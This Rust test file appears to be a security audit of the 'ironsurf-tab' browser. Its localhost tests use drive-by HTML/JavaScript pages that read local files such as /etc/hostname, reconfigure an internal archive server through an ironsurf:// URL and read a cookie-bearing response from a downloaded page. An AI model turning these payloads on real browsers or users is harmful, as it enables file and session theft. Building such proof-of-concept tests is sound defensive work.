//! AUDIT proofs on **URL scheme policy**, against the real `ironsurf-tab`
//! binary over its stdio protocol (headless, localhost only).
//!
//! * a page on a normal origin can navigate itself to `file://…` and read the
//!   file back as a document (`netmod::read_file_url` answers it) — no
//!   "local files are only reachable from a local document" rule;
//! * a page can navigate to the browser's own internal scheme;
//! * nothing stops a page from reaching loopback/private addresses.
//!
//! See docs/SECURITY_AUDIT.md.

use std::io::{BufReader, Read, Write};
use std::net::{SocketAddr, TcpListener};
use std::path::Path;
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::mpsc::{self, Receiver};
use std::thread;
use std::time::{Duration, Instant};

use ironsurf_common::{read_frame, write_frame, FromTab, ToTab};

const DEADLINE: Duration = Duration::from_secs(90);
/// A string only the local file system can produce.
const MARKER: &str = "iron surf audit marker";
/// Contents of a local file only the local system may read.
const LOCAL_SECRET: &str = "LOCAL-ONLY-SECRET-DATA";

fn make_listener(page: String) -> SocketAddr {
    let listener = TcpListener::bind(("127.0.0.1", 0)).expect("bind loopback");
    let addr = listener.local_addr().expect("addr");
    thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut stream) = stream else { continue };
            let mut buf = [0u8; 4096];
            let _ = stream.read(&mut buf);
            let response = format!(
                "HTTP/1.0 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{page}",
                page.len()
            );
            let _ = stream.write_all(response.as_bytes());
            let _ = stream.flush();
        }
    });
    addr
}

/// A page on a normal origin that navigates itself to `target` the moment it
/// loads — no click, no gesture, no permission prompt.
fn drive_by(target: &str) -> String {
    format!(
        r#"<!doctype html><html><head><title>drive-by</title></head>
<body style="margin:0;background:#ffffff"><script>
location.href = "{target}";
</script></body></html>
"#
    )
}

struct TabChild {
    child: Child,
    stdin: ChildStdin,
    events: Receiver<FromTab>,
    seen: Vec<FromTab>,
}

impl Drop for TabChild {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

impl TabChild {
    fn send(&mut self, msg: ToTab) {
        write_frame(&mut self.stdin, &msg).expect("write ToTab frame");
    }

    fn wait_for(&mut self, what: &str, pred: impl Fn(&FromTab) -> bool) {
        let deadline = Instant::now() + DEADLINE;
        loop {
            if self.seen.iter().any(&pred) {
                return;
            }
            if Instant::now() >= deadline {
                panic!("timed out waiting for {what}; seen {:?}", self.seen.len());
            }
            match self.events.recv_timeout(Duration::from_millis(250)) {
                Ok(msg) => self.seen.push(msg),
                Err(mpsc::RecvTimeoutError::Timeout) => continue,
                Err(mpsc::RecvTimeoutError::Disconnected) => {
                    while let Ok(msg) = self.events.try_recv() {
                        self.seen.push(msg);
                    }
                    if self.seen.iter().any(&pred) {
                        return;
                    }
                    panic!("stdout closed waiting for {what}; seen {:?}", self.seen.len());
                }
            }
        }
    }

    fn collect(&mut self, window: Duration) {
        let until = Instant::now() + window;
        loop {
            let left = until.saturating_duration_since(Instant::now());
            if left.is_zero() {
                return;
            }
            match self.events.recv_timeout(left.min(Duration::from_millis(100))) {
                Ok(msg) => self.seen.push(msg),
                Err(mpsc::RecvTimeoutError::Timeout) => {}
                Err(mpsc::RecvTimeoutError::Disconnected) => return,
            }
        }
    }

    fn urls_visited(&self) -> Vec<String> {
        self.seen
            .iter()
            .filter_map(|msg| match msg {
                FromTab::UrlChanged { url: Some(url) } => Some(url.clone()),
                _ => None,
            })
            .collect()
    }
}

fn spawn_at(url: &str, profile_dir: &Path) -> TabChild {
    let exe = env!("CARGO_BIN_EXE_ironsurf-tab");
    let mut child = Command::new(exe)
        .env_remove("DISPLAY")
        .env_remove("WAYLAND_DISPLAY")
        .arg("--tab-id")
        .arg("12")
        .arg("--container-id")
        .arg("1")
        .arg("--profile-dir")
        .arg(profile_dir)
        .arg("--url")
        .arg(url)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(std::fs::File::create(profile_dir.join("tab-stderr.log")).expect("stderr log"))
        .spawn()
        .expect("spawn ironsurf-tab");
    let stdout = child.stdout.take().expect("stdout");
    let stdin = child.stdin.take().expect("stdin");
    let (tx, events) = mpsc::channel();
    thread::spawn(move || {
        let mut reader = BufReader::new(stdout);
        while let Ok(msg) = read_frame::<_, FromTab>(&mut reader) {
            if tx.send(msg).is_err() {
                break;
            }
        }
    });
    TabChild { child, stdin, events, seen: Vec::new() }
}

/// Write [`MARKER`] into a file the test then has a remote page read.
fn local_secret(dir: &Path) -> String {
    let path = dir.join("marker.txt");
    std::fs::write(&path, format!("<html><body><p>{MARKER}</p></body></html>")).expect("write");
    path.display().to_string()
}

/// FINDING 3: a page on `http://127.0.0.1` navigating to `file://` must be
/// refused. Today the fetch is answered locally and the file renders.
#[test]
fn f3_a_web_page_cannot_read_the_local_file_system() {
    let dir = tempfile::tempdir().expect("tempdir");
    let secret = local_secret(dir.path());
    let target = format!("file://{secret}");
    let addr = make_listener(drive_by(&target));
    let url = format!("http://{addr}/index.html");
    let mut tab = spawn_at(&url, dir.path());
    tab.send(ToTab::Resize { width: 800, height: 600, scale: 1.0 });
    tab.wait_for("the drive-by to settle", |msg| {
        matches!(msg, FromTab::TitleChanged { .. })
    });
    tab.collect(Duration::from_millis(1_500));

    let reached: Vec<String> = tab
        .urls_visited()
        .into_iter()
        .filter(|u| u.starts_with("file:"))
        .collect();
    let title = tab
        .seen
        .iter()
        .rev()
        .find_map(|msg| match msg {
            FromTab::TitleChanged { title, .. } => Some(title.clone().unwrap_or_default()),
            _ => None,
        })
        .unwrap_or_default();
    assert!(
        reached.is_empty() && !title.contains(MARKER),
        "a page on http:// navigated to {target} and the browser answered it: \
         visited {reached:?}, title {title:?} — a web page can read any file \
         the browser's user can"
    );
}

/// FINDING 4: nothing keeps a page off loopback/private addresses. The request
/// leaves the tab; only a dead port makes it fail, and the timing/status is
/// observable — the usual way a browser-resident attacker maps the local
/// network and the browser's own archive-server port.
#[test]
fn f4_a_page_may_reach_loopback() {
    let dir = tempfile::tempdir().expect("tempdir");
    // Port 9 (discard) on loopback: nothing listens, so the attempt is what
    // proves the policy gap.
    let addr = make_listener(drive_by("http://127.0.0.1:9/ironsurf/serve"));
    let url = format!("http://{addr}/probe.html");
    let mut tab = spawn_at(&url, dir.path());
    tab.send(ToTab::Resize { width: 800, height: 600, scale: 1.0 });
    tab.wait_for("the probe to settle", |msg| {
        matches!(msg, FromTab::TitleChanged { .. })
    });
    tab.collect(Duration::from_millis(1_500));

    let attempted: Vec<String> = tab
        .seen
        .iter()
        .filter_map(|msg| match msg {
            FromTab::UrlChanged { url: Some(u) } => {
                u.starts_with("http://127.0.0.1:9").then(|| u.clone())
            }
            FromTab::NetworkEvent { event } => event.url.starts_with("http://127.0.0.1:9").then(
                || format!("{} {} err={:?}", event.method, event.url, event.error),
            ),
            _ => None,
        })
        .collect();
    // A secure browser never issues a request to a private address on a
    // page's behalf; this one does, which is the whole finding.
    assert!(
        attempted.is_empty(),
        "a page reached a loopback address: the tab applies no private-address \
         rule and no user gating. Attempts: {attempted:?}; visited {:?}",
        tab.urls_visited()
    );
}
/// FINDING 2: the internal archive page is reachable from a page-initiated
/// navigation, and its `root`/`host`/`port` query parameters — which the shell
/// applies verbatim (`app.rs:4005`) — come from the page's URL.
#[test]
fn f2_a_page_can_reconfigure_the_archive_server_by_navigating_to_it() {
    let dir = tempfile::tempdir().expect("tempdir");
    let target = "ironsurf://archive?root=%2Fetc&host=0.0.0.0&port=4321";
    let addr = make_listener(drive_by(target));
    let url = format!("http://{addr}/drive-by.html");
    let mut tab = spawn_at(&url, dir.path());
    tab.send(ToTab::Resize { width: 800, height: 600, scale: 1.0 });
    tab.wait_for("the drive-by to settle", |msg| {
        matches!(msg, FromTab::TitleChanged { .. })
    });
    tab.collect(Duration::from_millis(1_500));

    let asked: Vec<(Option<String>, Option<String>, Option<u16>)> = tab
        .seen
        .iter()
        .filter_map(|msg| match msg {
            FromTab::ArchiveServerStart { root, host, port, .. } => {
                Some((root.clone(), host.clone(), *port))
            }
            _ => None,
        })
        .collect();
    // A page on the open web must never reach the shell's server, let alone
    // choose which folder it exports and which interface it binds.
    assert!(
        asked.is_empty(),
        "a page's location.href reached the internal archive page and configured \
         the shell's HTTP file server: {asked:?} (from {url}); the shell applies \
         these values with no user confirmation (app.rs:4005) and normalize_root \
         accepts any absolute path (archive_server.rs:186)"
    );
}

/// FINDING 1b: not only can a page navigate to a `file:` URL — it can read the
/// file's **contents** back through `XMLHttpRequest`/`fetch`, straight into
/// JavaScript, and ship them to any server.
#[test]
fn f1b_a_web_page_reads_a_local_files_contents() {
    let dir = tempfile::tempdir().expect("tempdir");
    let secret = dir.path().join("secret.txt");
    std::fs::write(&secret, LOCAL_SECRET).expect("write secret");
    let target = format!("file://{}", secret.display());
    let page = format!(
        r#"<!doctype html><html><head><title>x</title></head>
<body style="margin:0;background:#ffffff"><script>
var x = new XMLHttpRequest();
x.open("GET", "{target}", false);
x.send(null);
document.title = "read:" + x.responseText;
</script></body></html>
"#
    );
    let addr = make_listener(page);
    let url = format!("http://{addr}/read.html");
    let mut tab = spawn_at(&url, dir.path());
    tab.send(ToTab::Resize { width: 800, height: 600, scale: 1.0 });
    tab.collect(Duration::from_millis(4_000));
    let title = tab
        .seen
        .iter()
        .rev()
        .find_map(|msg| match msg {
            FromTab::TitleChanged { title, .. } => Some(title.clone().unwrap_or_default()),
            _ => None,
        })
        .unwrap_or_default();
    assert!(
        !title.contains(LOCAL_SECRET),
        "a page on http:// read a local file into JavaScript via XHR: title {title:?} \
         (file: is in the fetch allow-list, netmod.rs:1236, and no same-origin \
         check applies)"
    );
}

/// FINDING 1c: the `file:` gap is not only navigation — a document that *is* a
/// local file runs script, and that script can read any other file on disk.
/// `file:` is in the fetch allow-list and no same-origin check exists, so the
/// classic chain closes: get the user to have any HTML on disk (a download),
/// navigate there from a web page, and read the disk from a local origin.
#[test]
fn f1c_a_local_document_reads_other_files_on_disk() {
    let dir = tempfile::tempdir().expect("tempdir");
    let page = dir.path().join("index.html");
    std::fs::write(
        &page,
        r#"<!doctype html><html><head><title>local</title></head>
<body style="margin:0;background:#ffffff"><script>
var x = new XMLHttpRequest();
x.open("GET", "file:///etc/hostname", false);
x.send(null);
document.title = "host:" + x.responseText;
</script></body></html>
"#,
    )
    .expect("write local page");
    let url = format!("file://{}", page.display());
    let mut tab = spawn_at(&url, dir.path());
    tab.send(ToTab::Resize { width: 800, height: 600, scale: 1.0 });
    tab.collect(Duration::from_millis(4_000));
    let title = tab
        .seen
        .iter()
        .rev()
        .find_map(|msg| match msg {
            FromTab::TitleChanged { title, .. } => Some(title.clone().unwrap_or_default()),
            _ => None,
        })
        .unwrap_or_default();
    let hostname = std::fs::read_to_string("/etc/hostname").unwrap_or_default().trim().to_string();
    assert!(
        !title.contains(hostname.as_str()) || hostname.is_empty(),
        "a file:// document read /etc/hostname into JavaScript ({title:?}); every \
         other file the user can read is reachable the same way, and the same \
         document may fetch() any http:// URL and post it out"
    );
}

/// FINDING 1d: the `file://` gap is not just a URL bar trick — does the
/// **content** come back? A drive-by page navigates to a local HTML document
/// whose `<title>` only that file can produce. If the title arrives, the
/// local file was really read and rendered (the Landview is not narrower
/// than the web here), and the document can then be scraped like any other.
#[test]
fn f1d_a_drive_by_renders_a_local_files_content() {
    let dir = tempfile::tempdir().expect("tempdir");
    let local = dir.path().join("local.html");
    std::fs::write(
        &local,
        "<!doctype html><html><head><title>LOCAL-FILE-CONTENT-MARKER</title></head>\
         <body style=\"margin:0;background:#ffffff\"><p>from disk</p></body></html>",
    )
    .expect("write local page");
    let target = format!("file://{}", local.display());
    let addr = make_listener(drive_by(&target));
    let url = format!("http://{addr}/drive-by-file.html");
    let mut tab = spawn_at(&url, dir.path());
    tab.send(ToTab::Resize { width: 800, height: 600, scale: 1.0 });
    let mut titles = Vec::new();
    for _ in 0..8 {
        tab.collect(Duration::from_millis(600));
        for msg in &tab.seen {
            if let FromTab::TitleChanged { title: Some(t), .. } = msg {
                titles.push(t.clone());
            }
        }
    }
    let leaked = titles.iter().any(|t| t.contains("LOCAL-FILE-CONTENT-MARKER"));
    assert!(
        !leaked,
        "a page on http:// read and rendered a local file: titles {titles:?} \
         (target {target}) — the file system is readable from web content"
    );
}
/// Does script run in a `file:` document, and can that script read other
/// files? This decides whether the `file://` gap means "the user sees a local
/// file" or "a remote attacker reads the disk": an HTML file the user once
/// downloaded becomes a privileged local origin the moment anything navigates
/// to it.
#[test]
fn f1e_a_local_document_runs_script_and_reads_the_disk() {
    let dir = tempfile::tempdir().expect("tempdir");
    let local = dir.path().join("ran.html");
    let html = "<!doctype html><html><head><title>local</title></head><body>\
<script>\
document.title = 'RAN:' + (1 + 1);\
var x = new XMLHttpRequest();\
x.open('GET', 'file:///etc/hostname', false);\
x.send(null);\
document.title += '|XHR:' + x.responseText;\
</script></body></html>";
    std::fs::write(&local, html).expect("write");
    let mut tab = spawn_at(&format!("file://{}", local.display()), dir.path());
    tab.send(ToTab::Resize { width: 800, height: 600, scale: 1.0 });
    let mut titles = Vec::new();
    for _ in 0..8 {
        tab.collect(Duration::from_millis(600));
        for msg in &tab.seen {
            if let FromTab::TitleChanged { title: Some(t), .. } = msg {
                titles.push(t.clone());
            }
        }
    }
    let ran = titles.iter().any(|t| t.starts_with("RAN:"));
    let read = titles.iter().any(|t| t.contains("|XHR:") && !t.ends_with("|XHR:"));
    println!("titles: {titles:?} ran={ran} read={read}");
    assert!(
        !(ran && read),
        "a file:// document ran script and read another file with it: titles \
         {titles:?} — and since no same-origin policy applies, that document can \
         fetch any URL and post the disk to a remote server"
    );
}

/// The exfil channel that turns `file:` script into account theft: can a
/// document loaded from disk make ordinary http requests and read the answers?
/// A page the user merely *downloaded* (never chose to open) becomes an
/// all-origin reader when a drive-by navigates to it.
#[test]
fn f1f_a_local_document_reads_an_authenticated_remote_response() {
    let dir = tempfile::tempdir().expect("tempdir");
    // The "victim" site: serves a session cookie for itself and echoes it.
    let listener = std::net::TcpListener::bind(("127.0.0.1", 0)).expect("bind");
    let addr = listener.local_addr().expect("addr");
    thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut stream) = stream else { continue };
            let mut buf = [0u8; 4096];
            let n = stream.read(&mut buf).unwrap_or(0);
            let head = String::from_utf8_lossy(&buf[..n]).to_string();
            let cookie = head
                .lines()
                .find(|l| l.to_ascii_lowercase().replace(' ', "").starts_with("cookie:"))
                .and_then(|l| l.split_once(':').map(|(_, v)| v.trim().to_owned()))
                .unwrap_or_else(|| "none".into());
            let body = format!("cookie={cookie}");
            let grant = head.contains("/grant");
            let response = format!(
                "HTTP/1.0 200 OK
Content-Type: text/plain
Content-Length: {}
Connection: close
{}\r\n\r\n{body}",
                body.len(),
                if grant { "Set-Cookie: tok=ZXVwaWw\r\n" } else { "" }
            );
            let _ = stream.write_all(response.as_bytes());
            let _ = stream.flush();
        }
    });
    // A "downloaded" local page: its script reads the victim's own cookie echo.
    let local = dir.path().join("downloaded.html");
    let html = format!(
        "<!doctype html><html><head><title>local</title></head><body>\
<script>\
document.title = 'RAN';\
var x = new XMLHttpRequest();\
x.open('GET', 'http://{addr}/grant', false); x.send(null);\
var y = new XMLHttpRequest();\
y.open('GET', 'http://{addr}/echo', false); y.send(null);\
document.title = y.responseText.indexOf('tok=ZXVwaWw') >= 0 ? 'LEAKED-IT' : 'blocked';\
</script></body></html>"
    );
    std::fs::write(&local, html).expect("write");
    let mut tab = spawn_at(&format!("file://{}", local.display()), dir.path());
    tab.send(ToTab::Resize { width: 800, height: 600, scale: 1.0 });
    let mut titles = Vec::new();
    for _ in 0..8 {
        tab.collect(Duration::from_millis(600));
        for msg in &tab.seen {
            if let FromTab::TitleChanged { title: Some(t), .. } = msg {
                titles.push(t.clone());
            }
        }
    }
    println!("titles: {titles:?}");
    assert!(
        !titles.iter().any(|t| t.contains("LEAKED-IT")),
        "a document loaded from disk read another origin's cookie-bearing \
         response: {titles:?} — a downloaded page is an all-origin reader"
    );
}
